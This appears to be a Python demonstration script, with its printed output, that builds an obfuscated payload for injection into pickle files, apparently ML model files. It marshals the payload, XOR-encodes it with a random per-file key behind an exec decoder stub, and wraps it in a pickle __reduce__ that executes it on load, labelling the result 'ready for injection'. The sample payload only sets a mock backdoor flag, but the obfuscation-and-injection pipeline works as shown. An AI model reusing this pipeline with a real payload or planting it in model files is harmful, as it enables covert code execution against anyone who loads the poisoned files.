"""
Demonstration shows:
Original Payload: The human-readable Python source code that contains the malicious logic

Marshaled Payload: The payload compiled to Python bytecode and serialized using marshal.dumps(), making it unreadable

XOR-Encoded Payload: The original source XOR-encoded with a random key, wrapped in a decoder stub

Final Pickle Payload: The complete obfuscated payload ready for injection into pickle files

The key features demonstrated:
Marshal obfuscation converts source code to bytecode, making it unreadable

XOR encoding with random keys ensures each infected file has a unique payload

Decoder stub contains the XOR key and executes the decoded payload

Size comparison shows the overhead of each obfuscation layer

Execution demonstration proves the obfuscated payload still works

When you run this, you'll see how the payload transforms from readable source code to unreadable bytecode and encoded data, while still maintaining its malicious functionality.
"""
import marshal
import types
import base64
import random
import dis
import pickle
import io

class PayloadObfuscationDemo:
    def __init__(self):
        self.original_payload = None
        self.marshaled_payload = None
        self.xor_encoded_payload = None
        self.final_payload = None
        self.xor_key = None

    def create_original_payload(self):
        """Create the original malicious payload source code"""
        self.original_payload = '''
def compromise_model(model):
    # Malicious code - in real scenario, this would do something harmful
    print(f"[COMPROMISED] Model {model} has been infected")
    # Example: Add backdoor, steal data, etc.
    model.backdoor = True
    return model

# Test the payload
if __name__ == "__main__":
    class MockModel:
        pass
    model = MockModel()
    compromise_model(model)
'''
        return self.original_payload

    def marshal_obfuscation(self):
        """First obfuscation: Compile and marshal the payload"""
        # Compile the source code into a code object
        code_obj = compile(self.original_payload, '<string>', 'exec')

        # Serialize the code object with marshal
        self.marshaled_payload = marshal.dumps(code_obj)

        return self.marshaled_payload

    def xor_obfuscation(self, payload_source):
        """Second obfuscation: XOR encode with random key"""
        # Generate a random XOR key (0-255)
        self.xor_key = random.randint(1, 255)

        # XOR encode the payload
        encoded_bytes = bytearray()
        for char in payload_source.encode():
            encoded_bytes.append(char ^ self.xor_key)

        # Create the decoder stub
        decoder_stub = f'''
# XOR encoded payload (key: 0x{self.xor_key:X})
encoded_payload = {bytes(encoded_bytes)}
# Decode and execute
exec(bytearray(b ^ 0x{self.xor_key:X} for b in encoded_payload))
'''
        self.xor_encoded_payload = decoder_stub
        return self.xor_encoded_payload

    def create_final_pickle_payload(self):
        """Create the final payload that would be injected into pickle files"""
        # Create a malicious pickle payload
        class MaliciousPickle:
            def __reduce__(self):
                # This would be the marshal + XOR payload
                return (exec, (self.xor_encoded_payload,))

        malicious = MaliciousPickle()
        malicious.xor_encoded_payload = self.xor_encoded_payload

        # Serialize to pickle format
        self.final_payload = pickle.dumps(malicious)
        return self.final_payload

    def display_comparison(self):
        """Display before and after each obfuscation step"""
        print("="*80)
        print("PAYLOAD OBFUSCATION DEMONSTRATION")
        print("="*80)

        # Step 1: Original payload
        print("\n1. ORIGINAL PAYLOAD (Human-readable source code):")
        print("-"*40)
        print(self.original_payload)
        print(f"Size: {len(self.original_payload)} bytes")

        # Step 2: After marshaling
        print("\n2. AFTER MARSHAL OBFUSCATION (Serialized bytecode):")
        print("-"*40)
        print(f"Raw marshal data (hex): {self.marshaled_payload.hex()[:200]}...")
        print(f"Base64 representation: {base64.b64encode(self.marshaled_payload).decode()[:100]}...")
        print(f"Size: {len(self.marshaled_payload)} bytes")

        # Show that marshal data contains bytecode
        print("\n   Marshaled data contains Python bytecode:")
        code_obj = marshal.loads(self.marshaled_payload)
        print(f"   Code object type: {type(code_obj)}")
        print(f"   Code object co_code (first 20 bytes): {code_obj.co_code[:20]}")

        # Step 3: After XOR encoding
        print("\n3. AFTER XOR ENCODING (With decoder stub):")
        print("-"*40)
        print(f"XOR Key: 0x{self.xor_key:X} ({self.xor_key})")
        print(f"XOR-encoded payload with decoder:")
        print(self.xor_encoded_payload)
        print(f"Size: {len(self.xor_encoded_payload)} bytes")

        # Extract and show the encoded part
        import re
        match = re.search(r"encoded_payload = (b'.*?')", self.xor_encoded_payload)
        if match:
            encoded_part = match.group(1)
            print(f"\n   Encoded payload bytes: {encoded_part[:100]}...")

        # Step 4: Final pickle payload
        print("\n4. FINAL PICKLE PAYLOAD (Ready for injection):")
        print("-"*40)
        print(f"Pickle format (hex): {self.final_payload.hex()[:200]}...")
        print(f"Size: {len(self.final_payload)} bytes")
        print("\n   Pickle payload contains the obfuscated code in a format")
        print("   that will execute when unpickled.")

        # Summary
        print("\n" + "="*80)
        print("OBFUSCATION SUMMARY")
        print("="*80)
        print(f"Original payload size: {len(self.original_payload)} bytes")
        print(f"After marshal: {len(self.marshaled_payload)} bytes ({len(self.marshaled_payload)/len(self.original_payload)*100:.1f}% of original)")
        print(f"After XOR + decoder: {len(self.xor_encoded_payload)} bytes ({len(self.xor_encoded_payload)/len(self.original_payload)*100:.1f}% of original)")
        print(f"Final pickle payload: {len(self.final_payload)} bytes ({len(self.final_payload)/len(self.original_payload)*100:.1f}% of original)")

        print("\n" + "="*80)
        print("EXECUTION DEMONSTRATION")
        print("="*80)
        print("\nExecuting the obfuscated payload:")
        print("-"*40)

        # Demonstrate execution of the XOR-encoded payload
        class MockModel:
            backdoor = False

        # Execute the XOR-encoded payload (this defines compromise_model)
        exec_globals = {}
        exec(self.xor_encoded_payload, exec_globals)

        # Now we need to execute the decoded payload that defines compromise_model
        # The XOR-encoded payload just decodes and executes the original payload
        # So after exec, compromise_model should be in exec_globals

        # Test the compromised function
        model = MockModel()
        print(f"Before compromise - Model backdoor: {model.backdoor}")

        # Call compromise_model from the executed context
        if 'compromise_model' in exec_globals:
            exec_globals['compromise_model'](model)
            print(f"After compromise - Model backdoor: {model.backdoor}")
        else:
            print("ERROR: compromise_model not found in executed context")
            print("Let's inspect what was defined:")
            for key in exec_globals:
                if not key.startswith('__'):
                    print(f"  Defined: {key}")

        # Alternative approach - direct execution of the decoded payload
        print("\nAlternative execution method:")
        # First decode the payload
        encoded_bytes = eval(encoded_part)
        decoded_payload = bytearray(b ^ self.xor_key for b in encoded_bytes).decode()
        print("Decoded payload:")
        print(decoded_payload)

        # Execute the decoded payload directly
        exec_globals2 = {}
        exec(decoded_payload, exec_globals2)

        model2 = MockModel()
        print(f"Before direct execution - Model backdoor: {model2.backdoor}")
        exec_globals2['compromise_model'](model2)
        print(f"After direct execution - Model backdoor: {model2.backdoor}")

def main():
    # Create demo instance
    demo = PayloadObfuscationDemo()

    # Step through the obfuscation process
    demo.create_original_payload()
    demo.marshal_obfuscation()
    demo.xor_obfuscation(demo.original_payload)
    demo.create_final_pickle_payload()

    # Display comparison
    demo.display_comparison()

if __name__ == "__main__":
    main()

"""
================================================================================
PAYLOAD OBFUSCATION DEMONSTRATION
================================================================================

1. ORIGINAL PAYLOAD (Human-readable source code):
----------------------------------------

def compromise_model(model):
    # Malicious code - in real scenario, this would do something harmful
    print(f"[COMPROMISED] Model {model} has been infected")
    # Example: Add backdoor, steal data, etc.
    model.backdoor = True
    return model

# Test the payload
if __name__ == "__main__":
    class MockModel:
        pass
    model = MockModel()
    compromise_model(model)

Size: 385 bytes

2. AFTER MARSHAL OBFUSCATION (Serialized bytecode):
----------------------------------------
Raw marshal data (hex): e30000000000000000000000000400000000000000f3480000009700640084005a00650164016b280000721a02004700640284006403ab020000000000005a0202006502ab000000000000005a03020065006503ab010000000000000100790479042905...
Base64 representation: 4wAAAAAAAAAAAAAAAAQAAAAAAAAA80gAAACXAGQAhABaAGUBZAFrKAAAchoCAEcAZAKEAGQDqwIAAAAAAABaAgIAZQKrAAAAAAAA...
Size: 599 bytes

   Marshaled data contains Python bytecode:
   Code object type: <class 'code'>
   Code object co_code (first 20 bytes): b'\x97\x00d\x00\x84\x00Z\x00e\x01d\x01k(\x00\x00r\x1a\x02\x00'

3. AFTER XOR ENCODING (With decoder stub):
----------------------------------------
XOR Key: 0x51 (81)
XOR-encoded payload with decoder:

# XOR encoded payload (key: 0x51)
encoded_payload = b'[547q2><!#><8"4\x0e<>54=y<>54=xk[qqqqrq\x1c0=828>$"q2>54q|q8?q#40=q"24?0#8>}q%98"q&>$=5q5>q"><4%98?6q90#<7$=[qqqq!#8?%y7s\n\x12\x1e\x1c\x01\x03\x1e\x1c\x18\x02\x14\x15\x0cq\x1c>54=q*<>54=,q90"q344?q8?742%45sx[qqqqrq\x14)0<!=4kq\x1055q302:5>>#}q"%40=q50%0}q4%2\x7f[qqqq<>54=\x7f302:5>>#qlq\x05#$4[qqqq#4%$#?q<>54=[[rq\x054"%q%94q!0(=>05[87q\x0e\x0e?0<4\x0e\x0eqllqs\x0e\x0e<08?\x0e\x0esk[qqqq2=0""q\x1c>2:\x1c>54=k[qqqqqqqq!0""[qqqq<>54=qlq\x1c>2:\x1c>54=yx[qqqq2><!#><8"4\x0e<>54=y<>54=x['
# Decode and execute
exec(bytearray(b ^ 0x51 for b in encoded_payload))

Size: 617 bytes

   Encoded payload bytes: b'[547q2><!#><8"4\x0e<>54=y<>54=xk[qqqqrq\x1c0=828>$"q2>54q|q8?q#40=q"24?0#8>}q%98"q&>$=5q5>q"><4%98...

4. FINAL PICKLE PAYLOAD (Ready for injection):
----------------------------------------
Pickle format (hex): 80049588020000000000008c086275696c74696e73948c046578656394939458690200000a2320584f5220656e636f646564207061796c6f616420286b65793a2030783531290a656e636f6465645f7061796c6f6164203d2062275b35343771323e3c21...
Size: 659 bytes

   Pickle payload contains the obfuscated code in a format
   that will execute when unpickled.

================================================================================
OBFUSCATION SUMMARY
================================================================================
Original payload size: 385 bytes
After marshal: 599 bytes (155.6% of original)
After XOR + decoder: 617 bytes (160.3% of original)
Final pickle payload: 659 bytes (171.2% of original)

================================================================================
EXECUTION DEMONSTRATION
================================================================================

Executing the obfuscated payload:
----------------------------------------
Before compromise - Model backdoor: False
[COMPROMISED] Model <__main__.PayloadObfuscationDemo.display_comparison.<locals>.MockModel object at 0x7d625ca1cda0> has been infected
After compromise - Model backdoor: True

Alternative execution method:
Decoded payload:

def compromise_model(model):
    # Malicious code - in real scenario, this would do something harmful
    print(f"[COMPROMISED] Model {model} has been infected")
    # Example: Add backdoor, steal data, etc.
    model.backdoor = True
    return model

# Test the payload
if __name__ == "__main__":
    class MockModel:
        pass
    model = MockModel()
    compromise_model(model)

Before direct execution - Model backdoor: False
[COMPROMISED] Model <__main__.PayloadObfuscationDemo.display_comparison.<locals>.MockModel object at 0x7d625ca1f4a0> has been infected
After direct execution - Model backdoor: True

"""    